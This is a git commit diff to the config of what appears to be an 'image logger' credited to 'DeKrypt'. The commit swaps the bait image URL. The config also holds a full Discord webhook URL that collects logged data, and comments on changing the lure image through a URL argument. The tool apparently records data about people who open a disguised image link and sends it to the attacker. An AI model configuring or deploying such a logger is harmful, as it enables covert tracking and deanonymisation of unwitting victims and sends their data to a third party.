39efe1e4df330a7e2f2e17968e1576787c00c882
Curvye <jaydenleemiller13@gmail.com>
2025-03-21 10:20:26 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1352657850941444127/7P8vvMOrerDRpyKy0uigQDlbvKvvw_284YVGOLrtZgVmJi2tGGMjy9jJmnehEkq9vVVL,"
-    "image": "https://upload.wikimedia.org/wikipedia/en/thumb/2/27/Bliss_%28Windows_XP%29.png/270px-Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRZofScLZf5CAfNF3qffJ7aeOTzpC8OKOkfJAbiTVkGkQHGL-2ILIuy7iSxM8SgWfhy1qk&usqp=CAU", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
